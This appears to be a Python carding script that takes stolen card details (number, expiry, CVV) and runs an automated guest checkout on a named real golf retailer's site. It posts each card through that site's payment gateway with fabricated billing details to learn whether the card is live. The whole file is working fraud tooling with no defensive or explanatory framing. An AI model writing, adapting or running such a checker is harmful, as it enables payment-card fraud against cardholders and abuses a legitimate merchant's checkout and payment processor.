import requests
import time
from retry import retry  # Make sure you installed this package with pip install retry

class PayflowAuth:
    def __init__(self):
        self.session = requests.Session()
        self.session.trust_env = False

    def set_headers(self):
        return {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.diamondtour.com",
            "referer": "https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        }

    def cut_str(self, text: str, a: str, b: str) -> str:
        try:
            return text.split(a)[1].split(b)[0]
        except:
            return "value not found"

    @retry(tries=3, delay=1, backoff=2)
    def main(self, card: str):
        start_time = time.time()
        cc = card.split("|")
        if len(cc) != 4:
            return [("Declined ❌", "Invalid card format - Expected cc|mm|yyyy|cvv")], round(time.time() - start_time, 2)

        if cc[0].startswith("4"):
            cctype = "VI"
        elif cc[0].startswith("5"):
            cctype = "MC"
        elif cc[0].startswith("3"):
            cctype = "AE"
        else:
            return [("Declined ❌", "Card type not supported (only Visa, Mastercard, Amex)")], round(time.time() - start_time, 2)

        form_key = None  # Initialize here for scope safety

        try:
            headers = self.set_headers()

            # Step 1: Get product page and extract form_key
            r1 = self.session.get(
                "https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html",
                headers=headers, timeout=200)
            if r1.status_code != 200:
                return [("Declined ❌", f"Failed to access product page. Status {r1.status_code}")], round(time.time() - start_time, 2)

            form_key = self.cut_str(r1.text, 'name="form_key" type="hidden" value="', '"')
            if not form_key or form_key == "value not found":
                return [("Declined ❌", "Failed to extract form_key")], round(time.time() - start_time, 2)

            # Step 2: Add product to cart
            headers.update({"content-type": "application/x-www-form-urlencoded",
                            "origin": "https://www.diamondtour.com",
                            "referer": "https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html",
                            "sec-fetch-site": "same-origin",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-dest": "empty"})
            data_cart = {
                "form_key": form_key,
                "product": "9161",
                "related_product": "",
                "super_attribute[559]": "732",
                "qty": "1"
            }
            url_cart_add = f"https://www.diamondtour.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZGlhbW5k" \
                           f"b250b3VyLmNvbS9nb2xmLWFjY2Vzc29yaWVzL2hlYWQtY292ZXJzL3JhY2VyLWRyaXZlci1oZWFk" \
                           f"Y292ZXIuaHRtbC9wcm9kdWN0LzkxNjEvform_key/{form_key}/"
            r2 = self.session.post(url_cart_add, headers=headers, data=data_cart, timeout=200)
            if r2.status_code != 200:
                return [("Declined ❌", f"Failed to add product to cart. Status {r2.status_code}")], round(time.time() - start_time, 2)

            # Step 3: Access cart
            headers.update({"referer": "https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html",
                            "sec-fetch-site": "same-origin",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-dest": "document"})
            r3 = self.session.get("https://www.diamondtour.com/checkout/cart/", headers=headers, timeout=200)
            if r3.status_code != 200:
                return [("Declined ❌", f"Failed to access cart. Status {r3.status_code}")], round(time.time() - start_time, 2)

            # Step 4: Start checkout
            headers.update({"referer": "https://www.diamondtour.com/checkout/cart/"})
            r4 = self.session.get("https://www.diamondtour.com/checkout/onepage/", headers=headers, timeout=200)
            if r4.status_code != 200:
                return [("Declined ❌", f"Failed to start checkout. Status {r4.status_code}")], round(time.time() - start_time, 2)

            # Step 5: Select payment method
            headers.update({"accept": "text/javascript, text/html, application/xml, text/xml, */*",
                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "origin": "https://www.diamondtour.com",
                            "referer": "https://www.diamondtour.com/checkout/onepage/",
                            "x-prototype-version": "1.7",
                            "x-requested-with": "XMLHttpRequest",
                            "sec-fetch-site": "same-origin",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-dest": "empty"})
            r5 = self.session.post("https://www.diamondtour.com/checkout/onepage/saveMethod/",
                                   headers=headers, data={"method": "guest"}, timeout=200)
            if r5.status_code != 200:
                return [("Declined ❌", f"Failed to select payment method. Status {r5.status_code}")], round(time.time() - start_time, 2)

            # Step 6: Save billing info
            headers.update({"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "origin": "https://www.diamondtour.com",
                            "referer": "https://www.diamondtour.com/checkout/onepage/",
                            "x-prototype-version": "1.7",
                            "x-requested-with": "XMLHttpRequest"})
            billing_data = {
                "billing[address_id]": "",
                "billing[firstname]": "Lucas",
                "billing[lastname]": "Lorenzo",
                "billing[company]": "OrganiMp",
                "billing[email]": "valerie.jenkins@gmail.com",
                "billing[street][]": ["E Little York Rd 7912", "E Little York Rd 7912"],
                "billing[city]": "Norman",
                "billing[region_id]": "12",
                "billing[region]": "",
                "billing[postcode]": "10010",
                "billing[country_id]": "US",
                "billing[telephone]": "8194544131",
                "billing[fax]": "",
                "billing[customer_password]": "",
                "billing[confirm_password]": "",
                "billing[save_in_address_book]": "1",
                "billing[use_for_shipping]": "1",
                "form_key": form_key,
            }
            r6 = self.session.post("https://www.diamondtour.com/checkout/onepage/saveBilling/", headers=headers,
                                   data=billing_data, timeout=200)
            if r6.status_code != 200:
                return [("Declined ❌", f"Failed to save billing info. Status {r6.status_code}")], round(time.time() - start_time, 2)

            # Step 7: Select shipping method
            headers.update({"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "origin": "https://www.diamondtour.com",
                            "priority": "u=1, i",
                            "referer": "https://www.diamondtour.com/checkout/onepage/",
                            "x-prototype-version": "1.7",
                            "x-requested-with": "XMLHttpRequest"})
            shipping_data = {"shipping_method": "shippingmodule_flatwithmethod", "form_key": form_key}
            r7 = self.session.post("https://www.diamondtour.com/checkout/onepage/saveShippingMethod/", headers=headers,
                                   data=shipping_data, timeout=200)
            if r7.status_code != 200:
                return [("Declined ❌", f"Failed to select shipping method. Status {r7.status_code}")], round(time.time() - start_time, 2)

            # Step 8: Save payment info
            headers.update({"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "origin": "https://www.diamondtour.com",
                            "referer": "https://www.diamondtour.com/checkout/onepage/",
                            "x-prototype-version": "1.7",
                            "x-requested-with": "XMLHttpRequest"})
            payment_data = {
                "payment[method]": "verisign",
                "payment[cc_type]": cctype,
                "payment[cc_number]": cc[0],
                "payment[cc_exp_month]": cc[1],
                "payment[cc_exp_year]": cc[2],
                "payment[cc_cid]": cc[3],
                "form_key": form_key,
            }
            r8 = self.session.post("https://www.diamondtour.com/checkout/onepage/savePayment/", headers=headers,
                                   data=payment_data, timeout=200)
            if r8.status_code != 200:
                return [("Declined ❌", f"Failed to save payment info. Status {r8.status_code}")], round(time.time() - start_time, 2)

            # Step 9: Check checkout progress
            headers.update({"referer": "https://www.diamondtour.com/checkout/onepage/",
                            "x-prototype-version": "1.7",
                            "x-requested-with": "XMLHttpRequest"})
            r9 = self.session.get("https://www.diamondtour.com/checkout/onepage/progress/", params={"prevStep": "payment"},
                                  headers=headers, timeout=200)
            if r9.status_code != 200:
                return [("Declined ❌", f"Failed to check checkout progress. Status {r9.status_code}")], round(time.time() - start_time, 2)

            # Step 10: Place order
            headers.update({"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "origin": "https://www.diamondtour.com",
                            "referer": "https://www.diamondtour.com/checkout/onepage/",
                            "x-prototype-version": "1.7",
                            "x-requested-with": "XMLHttpRequest"})
            order_data = {
                "payment[method]": "verisign",
                "payment[cc_type]": cctype,
                "payment[cc_number]": cc[0],
                "payment[cc_exp_month]": cc[1],
                "payment[cc_exp_year]": cc[2],
                "payment[cc_cid]": cc[3],
                "form_key": form_key,
                "agreement[1]": "1",
            }
            r10 = self.session.post(f"https://www.diamondtour.com/checkout/onepage/saveOrder/form_key/{form_key}/",
                                    headers=headers, data=order_data, timeout=100)
            elapsed = round(time.time() - start_time, 2)

            print(f"[DEBUG] Payflow response text:\n{r10.text}\n")

            if r10.status_code != 200:
                return [("Declined ❌", f"Failed to place order. Status {r10.status_code}")], elapsed

            return [r10.text], elapsed

        except requests.exceptions.Timeout:
            return [("Declined ❌", "Gateway Rejected: timeout")], round(time.time() - start_time, 2)
        except Exception as e:
            print(f"[DEBUG] Exception during request: {str(e)}")
            return [("Declined ❌", f"Gateway Rejected: connection_failed {str(e)}")], round(time.time() - start_time, 2)
        finally:
            self.session.close()